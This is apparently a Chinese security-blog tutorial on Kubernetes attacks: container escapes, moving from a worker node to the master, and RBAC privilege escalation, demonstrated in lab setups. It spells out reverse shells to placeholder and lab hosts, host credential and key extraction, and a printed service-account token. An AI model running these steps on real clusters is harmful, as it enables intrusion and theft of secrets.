

# K8s 集群安全攻防 (下) - 先知社区

K8s 集群安全攻防 (下)



## 文章前言

本篇文章是填补之前"K8s 集群安全攻防 (上)"挖的坑，主要补充 K8s 的逃逸、横向移动、权限维持、扩展技巧等内容

## 逃逸相关

### 配置不当

#### Privileged 特权模式逃逸

##### 前置知识

Security Context(安全上下文)，用于定义 Pod 或 Container 的权限和访问控制，Kubernetes 提供了三种配置 Security Context 的方法：

*   Pod Security Policy：应用于集群级别
*   Pod-level Security Context：应用于 Pod 级别
*   Container-level Security Context：应用于容器级别

容器级别：仅应用到指定的容器上，并且不会影响 Volume

```bash
apiVersion: v1
kind: Pod
metadata:
  name: hello-world
spec:
  containers:
    - name: hello-world-container
      image: ubuntu:latest
      securityContext:
        privileged: true
```

Pod 级别：应用到 Pod 内所有容器，会影响 Volume

```bash
apiVersion: v1
kind: Pod
metadata:
  name: hello-world
spec:
  containers:
  securityContext:
    fsGroup: 1234
    supplementalGroups: [5678]
    seLinuxOptions:
      level: "s0:c123,c456"
```

PSP，集群级别：PSP 是集群级的 Pod 安全策略，自动为集群内的 Pod 和 Volume 设置 Security Context  
[![](assets/1701606868-bbcdab71e39d6e7e45cf8e9efc0fd785.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027132824-a6153f30-7489-1.png)

##### 漏洞介绍

当容器启动加上--privileged 选项时，容器可以访问宿主机上所有设备，而 K8s 配置文件如果启用了"privileged: true"也可以实现挂载操作

##### 逃逸演示

Step 1：使用 docker 拉取 ubuntu 镜像到本地

```bash
sudo docker pull ubuntu
```

[![](assets/1701606868-c649ffe3654234097e25e8d6cf13aa51.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133008-e44a9098-7489-1.png)  
Step 2：创建一个 Pod 的 yaml 文件

```bash
apiVersion: v1
kind: Pod
metadata:
  name: myapp-test
spec:
  containers:
  - image: ubuntu:latest
    name: ubuntu
    securityContext:
      privileged: true
```

[![](assets/1701606868-949ec7823c0b5956c4b6883357db2e85.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133148-1ff4a17e-748a-1.png)  
Step 3：创建一个 Pod

```bash
kubectl create -f myapp-test.yaml
```

[![](assets/1701606868-4982eb94efbae8d9726be6c336865d40.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133242-400f5b48-748a-1.png)  
Step 3：进入 Pod 进行逃逸操作

```bash
#进入 pod
kubectl exec -it myapp-test /bin/bash

#查看磁盘
fdisk -l
```

[![](assets/1701606868-3005789126ef6df9e7c91f1a9d80446a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133307-4f08ba54-748a-1.png)  
Step 4：查看权限

```bash
cat /proc/self/status | grep CapEff
```

[![](assets/1701606868-38800c317f53ed661de9fd15b1676f8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133331-5d0c4e9a-748a-1.png)  
Step 5：使用 CDK 进行逃逸

```bash
./cdk run mount-disk
```

[![](assets/1701606868-df781339a7a4c2ae82dd9f81bc70fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133355-6b561fc6-748a-1.png)  
在容器内部进入挂载目录，直接管理宿主机磁盘文件 (多少有一些问题)  
[![](assets/1701606868-bbbdb0182cb25ce3f6bcbd9cb92271e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133417-78f9e41e-748a-1.png)

#### CAP\_SYS\_ADMIN 配置逃逸

##### 漏洞概述

Docker 通过 Linux Namespace 实现 6 项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯，但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限：

*   \--pid=host 启动时，绕过 PID Namespace
*   \--ipc=host 启动时，绕过 IPC Namespace
*   \--net=host 启动时，绕过 Network Namespace
*   \--cap-add=SYS\_ADMIN 启动时，允许执行 mount 特权操作，需获得资源挂载进行利用

##### 利用前提

*   在容器内 root 用户
*   容器必须使用 SYS\_ADMIN Linux capability 运行
*   容器必须缺少 AppArmor 配置文件，否则将允许 mount syscall
*   cgroup v1 虚拟文件系统必须以读写方式安装在容器内部

##### 前置知识

**cgroup**  
默认情况下容器在启动时会在/sys/fs/cgroup 目录各个 subsystem 目录的 docker 子目录里生成以容器 ID 为名字的子目录，我们通过执行以下命令查看宿主机里的 memory cgroup 目录，可以看到 docker 目录里多了一个目录 9d14bc4987d5807f691b988464e167653603b13faf805a559c8a08cb36e3251a，这一串字符是容器 ID，这个目录里的内容就是用户在容器里查看/sys/fs/cgroup/memory 的内容  
[![](assets/1701606868-66d41e9dea93c281032892d9860c8f68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133631-c85a08fe-748a-1.png)  
**mount**  
mount 命令是一个系统调用 (syscall) 命令，系统调用号为 165，执行 syscall 需要用户具备 CAP\_SYS\_ADMIN 的 Capability，如果在宿主机启动时添加了--cap-add SYS\_ADMIN 参数，那 root 用户就能在容器内部就能执行 mount 挂载 cgroup，docker 默认情况下不会开启 SYS\_ADMIN Capability

##### 漏洞利用

漏洞利用的第一步是在容器里创建一个临时目录/tmp/cgrp 并使用 mount 命令将系统默认的 memory 类型的 cgroup 重新挂载到/tmp/cgrp 上

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
```

参数解释：

*   \-t 参数：表示 mount 的类别为 cgroup
*   \-o 参数：表示挂载的选项，对于 cgroup，挂载选项就是 cgroup 的 subsystem，每个 subsystem 代表一种资源类型，比如：cpu、memory  
    执行该命令之后，宿主机的 memory cgroup 被挂载到了容器中，对应目录/tmp/cgrp

[![](assets/1701606868-d71788450178dd1dd552276ca20c6de8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133725-e9113e82-748a-1.png)  
需要注意的是在对 cgroup 进行重新挂载的操作时只有当被挂载目标的 hierarchy 为空时才能成功，因此如果这里 memory 的重新挂载不成功的话可以换其他的 subsystem，接着就是在这个 cgroup 类型里建一个子目录 x

```bash
mkdir /tmp/cgrp/x
```

漏洞利用的第二步和 notify\_no\_release 有关，cgroup 的每一个 subsystem 都有参数 notify\_on\_release，这个参数值是 Boolean 型，1 或 0，分别可以启动和禁用释放代理的指令，如果 notify\_on\_release 启用当 cgroup 不再包含任何任务时 (即 cgroup 的 tasks 文件里的 PID 为空时)，系统内核会执行 release\_agent 参数指定的文件里的文本内容，不过需要注意的是 release\_agent 文件并不在/tmp/cgrp/x 目录里，而是在 memory cgroup 的根目录/tmp/cgrp 里，这样的设计可以用来自动移除根 cgroup 里所有空的 cgroup，我们可以通过执行以下命令将/tmp/cgrp/x 的 notify\_no\_release 属性设置为 1

```bash
echo 1 > /tmp/cgrp/x/notify_no_release
```

接着通过将 release\_agent 指定为容器在宿主机上的 cmd 文件，具体操作是先获取 docker 容器在宿主机上的存储路径：

```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

文件/etc/mtab 存储了容器中实际挂载的文件系统  
[![](assets/1701606868-94c8e9e550de453a4cee45d39001104d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133829-0edbbd22-748b-1.png)  
这里使用 sed 命令匹配 perdir=(和) 之间的非逗号内容，从上图可以看出，host\_path 就是 docker 的 overlay 存储驱动上的可写目录 upperdir  
[![](assets/1701606868-d241287133c59c11e851c36edeb41900.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133858-20555cac-748b-1.png)  
在这个目录里创建一个 cmd 文件，并把它作为/tmp/cgrp/x/release\_agent 参数指定的文件：

```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

接下来 POC 将要执行的 shell 写到 cmd 文件里，并赋予执行权限

```bash
echo '#!/bin/sh' > /cmd
echo "sh -i >& /dev/tcp/10.0.0.1/8443 0>&1" >> /cmd
chmod a+x /cmd
```

最后 POC 触发宿主机执行 cmd 文件中的 shell

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

该命令启动一个 sh 进程，将 sh 进程的 PID 写入到/tmp/cgrp/x/cgroup.procs 里，这里的\\$\\$表示 sh 进程的 PID，在执行完 sh -c 之后，sh 进程自动退出，这样 cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release\_agent文件里的shell将被操作系统内核执行  
[![](assets/1701606868-83f77d27985d3556bc6c041e4170a98d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133935-3631cb5a-748b-1.png)

#### CAP\_DAC\_READ\_SEARCH

##### 影响范围

Docker 1.0

##### 场景描述

在早期的 docker 中容器内是默认拥有 CAP\_DAC\_READ\_SEARCH 的权限的，拥有该 Capability 权限之后，容器内进程可以使用 open\_by\_handle\_at 函数对宿主机文件系统暴力扫描，以获取宿主机的目标文件内容，Docker1.0 之前对容器能力 (Capability) 使用黑名单策略管理，并未限制 CAP\_DAC\_READ\_SEARCH 能力，故而赋予了 shocker.c 程序调用 open\_by\_handle\_at 函数的能力，导致容器逃逸的发生

##### 环境构建

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

[![](assets/1701606868-14f2c9c4bd0a77b99936515b74c10e54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134108-6dfce90c-748b-1.png)

```bash
./metarget cnv install cap_dac_read_search-container
```

[![](assets/1701606868-7830ac6e46f875ed7a6f72b782a2f469.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134130-7ade5bba-748b-1.png)  
备注：此场景较为简单可以直接使用 Docker 手动搭建，默认存在漏洞的 Docker 版本过于久远，但是复现漏洞可以使用任意版本的 Docker，只需要在启动 Docker 时通过--cap-add 选项来添加 CAP\_DAC\_READ\_SEARCH capability 的权限即可

##### 漏洞复现

Step 1：查看容器列表可以发现此时有一个名为 cap-dac-read-search-container 的带有 CAP\_DAC\_READ\_SEARCH 权限的容器

```bash
docker ps -a | grep cap
docker top 5713dea
getpcaps 51776
```

[![](assets/1701606868-d93d1c97d20ca5b0b765b416a0dea672.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134236-a210243e-748b-1.png)  
Step 2：下载 poc 文件并修改 shocker.c 中.dockerinit 文件为 /etc/hosts

```bash
#初始文件
// get a FS reference from something mounted in from outside
if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
  die("[-] open");

#更改文件
// 由于文件需要和宿主机在同一个挂载的文件系统下，而高版本的.dockerinit 已经不在宿主机的文件系统下了
// 但是/etc/resolv.conf,/etc/hostname,/etc/hosts 等文件仍然是从宿主机直接挂载的，属于宿主机的文件系统
if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
  die("[-] open");
```

[![](assets/1701606868-1d6ad837341af514bf6b0412c08b0063.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134258-af92e6b4-748b-1.png)  
Step 3：编译 shock.c 文件

```bash
gcc shocker.c -o shocker
```

[![](assets/1701606868-54dd409f1a39b4e1b7f1d11b4df9e2c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134320-bc7e4efe-748b-1.png)  
Step 4：docker cp 到容器内运行后成功访问到了宿主机的/etc/shadow 文件

```bash
#基本格式
docker cp 本地路径 容器 ID:容器路径

#使用实例
docker cp /home/ubuntu/shocker 5713dea8ce4b:/tmp/shocker
```

[![](assets/1701606868-df4074eb493f175b0ac830f2464a8a8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134348-cd12a3a0-748b-1.png)  
[![](assets/1701606868-2d5f4a941a10cc169f5b15817b0a1ba2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134358-d349a9f8-748b-1.png)

### 内核漏洞

内核漏洞由很多都可以利用，例如：

*   CVE-2016-5195:脏牛漏洞逃逸
*   CVE-2017-7308:Linux 内核逃逸
*   CVE-2017-1000112:Linux 内核逃逸
*   CVE-2021-22555:Linux 内核逃逸
*   CVE-2021-31440:Linux eBPF
*   CVE-2022-0185:Linux Kernel Escape

下面仅以脏牛漏洞逃逸为例：

#### 影响范围

Linux kernel 2.x through 4.x before 4.8.3

#### 漏洞描述

Dirty Cow(CVE-2016-5195) 是 Linux 内核中的权限提升漏洞，通过它可实现 Docker 容器逃逸，获得 root 权限的 shell，需要注意的是 Docker 与宿主机共享内核，因此容器需要在存在 dirtyCow 漏洞的宿主机里运行

#### 漏洞复现

Step 1：测试环境下载

```bash
git clone https://github.com/gebl/dirtycow-docker-vdso.git
```

Step 2：运行测试容器

```bash
cd dirtycow-docker-vdso/
sudo docker-compose run dirtycow /bin/bash
```

Step 3：进入容器编译 POC 并执行

```bash
cd /dirtycow-vdso/
make
./0xdeadbeef 192.168.172.136:1234
```

[![](assets/1701606868-866732cdf18e94e714cbd0fb14e31574.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140130-45db501e-748e-1.png)  
Step 4：在 192.168.172.136 监听本地端口，成功接收到宿主机反弹的 shell

[![](assets/1701606868-f8810b60324b7dc47bfc7b13d19fe120.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140145-4f3f6fd2-748e-1.png)  
这里留一个常被用于面试的问题给大家思考：  
为什么内核漏洞可以导致容器逃逸？基本原理是什么？

### 危险挂载

#### HostPath 目录挂载

##### 场景描述

由于用户使用较为危险的挂载将物理机的路径挂载到了容器内，从而导致逃逸

##### 具体实现

Step 1：查看当前权限确定该容器具有主机系统的完整权限  
[![](assets/1701606868-938b7db59ff7645522c29252c9aa363c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140722-17a4a294-748f-1.png)  
Step 2：发现/host-system 从主机系统安装

```bash
ls -al
ls /host-system/
```

[![](assets/1701606868-062640536df26c107724f5891079fb06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140749-2832f46c-748f-1.png)  
Step 3：获得主机系统权限

```bash
chroot /host-system bash
docker ps
```

[![](assets/1701606868-26e4d14cca87165f5821d4dfaa255e14.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140807-32a372be-748f-1.png)  
Step 4：访问节点级别 Kubernetes 的 kubelet 配置

```bash
cat /var/lib/kubelet/kubeconfig
```

[![](assets/1701606868-3640bbdeef9f47b51a69422e9b199715.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140825-3d9f1fe2-748f-1.png)  
Step 5：使用 kubelet 配置执行 Kubernetes 集群范围的资源

```bash
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
```

[![](assets/1701606868-c9253e1b08a71d6ecd8cf04ddd1218ef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140849-4b8457c6-748f-1.png)

#### /var/log危险挂载

##### 场景介绍

当 Pod 以可写权限挂载了宿主机的/var/log 目录，而且 Pod 里的 Service Account 有权限访问该 Pod 在宿主机上的日志时，攻击者可以通过在容器内创建符号链接来完成简单逃逸，简单归纳总结如下：

*   挂载了/var/log
*   容器在一个 K8s 的环境中
*   Pod 的 ServiceAccount 拥有 get|list|watch log 的权限

##### 原理简介

下图展示了 kubectl logs <pod-name> 如何从 pod 中检索日志</pod-name>

[![](assets/1701606868-e8cdba964fe4922f8b7dca4a67cd077e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140935-67148d62-748f-1.png)  
kubelet 会在宿主机上的/var/log 目录中创建一个目录结构，如图符号 1，代表节点上的 pod，但它实际上是一个符号链接，指向/var/lib/docker/containers 目录中的容器日志文件，当使用 kubectl logs <pod-name>命令查询指定 pod 的日志时，实际上是向 kubelet 的/logs/pods/<path\_to\_0.log>接口发起 HTTP 请求，对于该请求的处理逻辑如下</pod-name>

```bash
#kubernetes\pkg\kubelet\kubelet.go:1371
if kl.logServer == nil {
        kl.logServer = http.StripPrefix("/logs/", http.FileServer(http.Dir("/var/log/")))
}
```

kubelet 会解析该请求地址去/var/log 对应的目录下读取 log 文件并返回，当 pod 以可写权限挂载了宿主机上的/var/log 目录时，可以在该路径下创建一个符号链接指向宿主机的根目录，然后构造包含该符号链接的恶意 kubelet 请求，宿主机在解析时会解析该符号链接，导致可以读取宿主机任意文件和目录

##### 环境搭建

```bash
#基础环境
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic

#漏洞环境
./metarget cnv install mount-var-log
```

[![](assets/1701606868-aec6cb661115b351cb2ceaf4b2730479.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141145-b4bdc3b2-748f-1.png)  
执行完成后，K8s 集群内 metarget 命令空间下将会创建一个名为 mount-var-log 的 pod

[![](assets/1701606868-dd7c1841f1b1028f1a4156e87804a01b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141200-bd74e058-748f-1.png)

##### 漏洞复现

Step 1：执行以下命令进入容器

```bash
kubectl -n metarget exec -it mount-var-log  /bin/bash
```

[![](assets/1701606868-c09b2d1e02f1b697bdd1a57ca910bbb6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141231-d019e546-748f-1.png)  
Step 2：查看文件，Pod 内可执行以下两种命令

```bash
lsh     等于宿主机上的 ls
cath    等于宿主机上的 cat
```

[![](assets/1701606868-263faaf8bfa626857a4929a898017ef6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141301-e1fd749e-748f-1.png)

[![](assets/1701606868-201da49a99daae20a8ba046abf5cd329.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141309-e6c96cf8-748f-1.png)

##### 敏感文件

```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ python find_sensitive_files.py
[*] Got access to kubelet /logs endpoint
[+] creating symlink to host root folder inside /var/log

[*] fetching token files from host
[+] extracted hostfile: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/metadata-agent-token-xjfh9/token

[*] fetching private key files from host
[+] extracted hostfile: /home/ubuntu/.ssh/private.key
[+] extracted hostfile: /etc/srv/kubernetes/pki/kubelet.key
...
```

之后会下载对应的敏感文件到以下位置：

```bash
#Token Files
/root/exploit/host_files/tokens

#Key Files
/root/exploit/host_files/private_keys
```

##### 漏洞 EXP

[https://github.com/danielsagi/kube-pod-escape](https://github.com/danielsagi/kube-pod-escape)

[![](assets/1701606868-caa22557e9abedadc0c074a69c357cb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141408-09c0657c-7490-1.png)

#### Procfs 目录逃逸类

##### 场景介绍

procfs 是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件，因此将宿主机的 procfs 挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用 root 权限，且没有开启 User Namespace 时 (Docker 默认情况下不会为容器开启 User Namespace)，一般来说我们不会将宿主机的 procfs 挂载到容器中，然而有些业务为了实现某些特殊需要，还是会将该文件系统挂载进来，procfs 中的/proc/sys/kernel/core\_pattern 负责配置进程崩溃时内存转储数据的导出方式，从 2.6.19 内核版本开始 Linux 支持在/proc/sys/kernel/core\_pattern 中使用新语法，如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行

##### 环境搭建

基础环境构建：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install mount-host-procfs
```

执行完成后 K8s 集群内 metarget 命令空间下将会创建一个名为 mount-host-procfs 的 pod，宿主机的 procfs 在容器内部的挂载路径是/host-proc

##### 漏洞复现

执行以下命令进入容器：

```bash
kubectl exec -it -n metarget mount-host-procfs /bin/bash
```

在容器中首先拿到当前容器在宿主机上的绝对路径：

```bash
root@mount-host-procfs:/# cat /proc/mounts | grep docker
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/SDXPXVSYNB3RPWJYHAD5RIIIMO:/var/lib/docker/overlay2/l/QJFV62VKQFBRS5T5ZW4SEMZQC6:/var/lib/docker/overlay2/l/SSCMLZUT23WUSPXAOVLGLRRP7W:/var/lib/docker/overlay2/l/IBTHKEVQBPDIYMRIVBSVOE2A6Y:/var/lib/docker/overlay2/l/YYE5TPGYGPOWDNU7KP3JEWWSQM,upperdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/diff,workdir=/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/work 0 0
```

从 workdir 可以得到基础路径，结合背景知识可知当前容器在宿主机上的 merged 目录绝对路径如下：

```bash
/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged
```

向容器内/host-proc/sys/kernel/core\_pattern 内写入以下内容：

```bash
echo -e "|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \rcore  " > /host-proc/sys/kernel/core_pattern
```

然后在容器内创建一个反弹 shell 的/tmp/.x.py：

```bash
cat >/tmp/.x.py << EOF
#!/usr/bin/python
import os
import pty
import socket
lhost = "attacker-ip"
lport = 10000
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    os.remove('/tmp/.x.py')
    s.close()
if __name__ == "__main__":
    main()
EOF

chmod +x /tmp/.x.py
```

最后在容器内运行一个可以崩溃的程序即可，例如：

```bash
#include <stdio.h>
int main(void)
{
    int *a = NULL;
    *a = 1;
    return 0;
}
```

容器内若没有编译器，可以先在其他机器上编译好后放入容器中，等完成后在其他机器上开启 shell 监听：

```bash
ncat -lvnp 10000
```

接着在容器内执行上述编译好的崩溃程序，即可获得反弹 shell

## 横向渗透

### 基础知识

污点是 K8s 高级调度的特性，用于限制哪些 Pod 可以被调度到某一个节点，一般主节点包含一个污点，这个污点是阻止 Pod 调度到主节点上面，除非有 Pod 能容忍这个污点，而通常容忍这个污点的 Pod 都是系统级别的 Pod，例如:kube-system  
[![](assets/1701606868-9dd4653e2aba00ba0dc3364c67741af8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141814-9c3f5066-7490-1.png)

### 基本原理

攻击者在获取到 node 节点的权限后可以通过 kubectl 来创建一个能够容忍主节点的污点的 Pod，当该 Pod 被成功创建到 Master 上之后，攻击者可以通过在子节点上操作该 Pod 实现对主节点的控制

### 横向移动

Step 1：Node 中查看节点信息

```bash
kubectl get nodes
```

[![](assets/1701606868-33a0cde35193489589a166d8cd48920d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141908-bc97729e-7490-1.png)  
Step 2：确认 Master 节点的容忍度

```bash
#方式一
kubectl describe nodes master
```

[![](assets/1701606868-eb835416fcfee17efa97e7c249f57d13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141931-ca989ff8-7490-1.png)

```bash
#方式二
kubectl describe node master | grep 'Taints' -A 5
```

[![](assets/1701606868-bc06ce138aae109f170c98bfc5e380fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141947-d41752ea-7490-1.png)  
Step 3：创建带有容忍参数的 Pod(必要时可以修改 Yaml 使 Pod 增加到特定的 Node 上去)

```bash
apiVersion: v1
kind: Pod
metadata:
  name: control-master-15
spec:
  tolerations:
    - key: node-role.kubernetes.io/master
      operator: Exists
      effect: NoSchedule
  containers:
    - name: control-master-15
      image: ubuntu:18.04
      command: ["/bin/sleep", "3650d"]
      volumeMounts:
      - name: master
        mountPath: /master
  volumes:
  - name: master
    hostPath:
      path: /
      type: Directory
```

[![](assets/1701606868-1cee6b7080bb61dc07fa49c0849de883.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142010-e179c12a-7490-1.png)

```bash
#创建 Pod
kubectl create -f control-master.yaml

#部署情况
kubectl get deploy -o wide

#Pod 详情
kubectl get pod -o wide
```

[![](assets/1701606868-4631a420d50aa8e41b8b43647e4ed455.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142032-eec932f2-7490-1.png)  
Step 4：获得 Master 控制端

```bash
kubectl exec control-master-15 -it bash
chroot /master bash
ls -al
cat /etc/shadow
```

[![](assets/1701606868-8eddea08c1232adb862375e4b61e6d7d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142051-f9e180fe-7490-1.png)

[![](assets/1701606868-7a3b798997d7499db4b56cae9d92d208.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142058-fe288252-7490-1.png)

#### 扩展技巧

执行以下命令清除污点之后直接执行部署 Pod 到 Master 上，之后通过挂载实现逃逸获取 Master 节点的权限

```bash
#清除污点
kubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule-

#查看污点
kubectl describe node master | grep 'Taints' -A 5
```

## 权限提升

K8s 中的权限提升可以参考以下 CVE 链接，这里不再做复现：  
1、CVE-2018-1002105:Kubernetes API Server Privileges Escalation：  
[https://goteleport.com/blog/kubernetes-websocket-upgrade-security-vulnerability/](https://goteleport.com/blog/kubernetes-websocket-upgrade-security-vulnerability/)  
2, CVE-2019-11247:Kubernetes API Server Privileges Escalation:  
[https://github.com/kubernetes/kubernetes/issues/80983](https://github.com/kubernetes/kubernetes/issues/80983)  
3, CVE-2020-8559:Kubernetes API Server Privileges Escalation:  
[https://github.com/tdwyer/CVE-2020-8559](https://github.com/tdwyer/CVE-2020-8559)  
下面对 Rolebinding 权限提升进行一个简单的演示：

### 基本介绍

K8s 使用基于角色的访问控制 (RBAC) 来进行操作鉴权，允许管理员通过 Kubernetes API 动态配置策略，某些情况下运维人员为了操作便利，会对普通用户授予 cluster-admin 的角色，攻击者如果收集到该用户登录凭证后，可直接以最高权限接管 K8s 集群，少数情况下攻击者可以先获取角色绑定 (RoleBinding) 权限，并将其他用户添加 cluster-admin 或其他高权限角色来完成提权

### 简易实例

Step 1：下载 yaml 文件

```bash
wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0-beta8/aio/deploy/recommended.yaml
```

[![](assets/1701606868-1729d4bdf6a2ad822f6e188c77cd7ec9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142633-c5e5ac20-7491-1.png)  
Step 2：修改 YAML 文件  
[![](assets/1701606868-fe4b3685ab3e3300e701c770ef13a594.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142646-cd97d678-7491-1.png)  
[![](assets/1701606868-1f9e420c04034a79d04ff0a6418c45bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142658-d5091e12-7491-1.png)  
Step 3：下载镜像  
[![](assets/1701606868-69403831b6a3d50aa1fdb92e4dc25e2c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142710-dbd29c50-7491-1.png)  
Step 4：进行部署操作

```bash
#部署操作
kubectl apply -f kubernetes-dashboard.yaml

#删除操作
kubectl delete -f kubernetes-dashboard.yaml
```

[![](assets/1701606868-9c5d734d755c66c3014d1f1a4a4958b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142730-e82fd332-7491-1.png)  
Step 5：查看 pod 和 service 状态

```bash
kubectl get pods,svc -n kubernetes-dashboard -o wide
```

[![](assets/1701606868-abfd76d5b31d086c9569014303073a4b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142752-f541a87a-7491-1.png)  
Step 6：查看所有的 pod

```bash
kubectl get pods --all-namespaces -o wide
```

[![](assets/1701606868-1ec2d656be68ffa02cf5ef88292a8fc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142812-00e0600e-7492-1.png)  
Step 7：在浏览器中访问，选择用默认用户 kubernetes-dashboard 的 token 登陆

[![](assets/1701606868-1521086714d6de12427c78e22aee597b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142827-09cd17ac-7492-1.png)  
Step 8：查看 serviceaccount 和 secrets

```bash
kubectl  get sa,secrets -n kubernetes-dashboard
```

[![](assets/1701606868-47919a98fc3514107ffffa925e7f78ee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142841-123a26f0-7492-1.png)  
Step 9：查看 token

```bash
kubectl describe secrets kubernetes-dashboard-token-8kxnh -n kubernetes-dashboard
```

[![](assets/1701606868-ffa24b2e0e95b2db5f4f53b2ae10bec3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142859-1d1f000e-7492-1.png)

```bash
eyJhbGciOiJSUzI1NiIsImtpZCI6Iml3OVRtaVlnREpPQ0h2ZlUwSDBleFlIc29qcXgtTmtaUFN4WDk4NjZkV1EifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZC10b2tlbi04a3huaCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImMyYTE0NTAzLTc4MzgtNGY3MS1iOTBjLTFhMWJkOTk4NGFiMiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlcm5ldGVzLWRhc2hib2FyZDprdWJlcm5ldGVzLWRhc2hib2FyZCJ9.bQOXikheuY7kL0Dki0mLmyVvGT9cDc4HvdUWXPRywjFPCZNeX6mMurU6pr9LJR25MFwF4Y3ZlnGzHDbrGR-bYRLwDsSvX-qvh0BLCZhQORE2gfd971lCQc7uoyrkf-EJrg26_0C2yGGhZI7JdcRDjrjuHG0aZpQ1vNZYrIWwj5hj9yn7xVI0-dVLbjx8_1kmRXIKw